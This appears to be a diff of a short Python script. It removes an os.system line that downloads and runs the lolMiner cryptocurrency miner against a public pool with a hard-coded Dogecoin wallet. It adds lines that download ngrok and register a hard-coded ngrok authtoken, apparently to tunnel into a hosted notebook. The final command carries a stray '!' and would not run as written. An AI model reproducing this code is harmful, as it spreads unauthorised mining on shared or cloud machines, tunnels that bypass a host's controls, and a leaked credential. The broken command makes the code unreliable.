@@ -1,3 +1,8 @@
 import os
-
-os.system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.40/lolMiner_v1.40_Lin64.tar.gz && tar -xf lolMiner_v1.40_Lin64.tar.gz && cd 1.40 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user DOGE:DK6o5ZRzqzznLodqpBCuETzdgRgd8SDEki.5 --ethstratum ETHPROXY")
+from colabcode import ColabCode
+from time import sleep
+print("make sure to install colabcode by pip")
+sleep(2)
+os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz")
+os.system("tar -xf ngrok-stable-linux-amd64.tgz")
+os.system("!./ngrok authtoken 23C8Mj5lBcgqgglDqXTa2c5FnYw_7H5qAnw9AJ6KfHaEUPn5e")
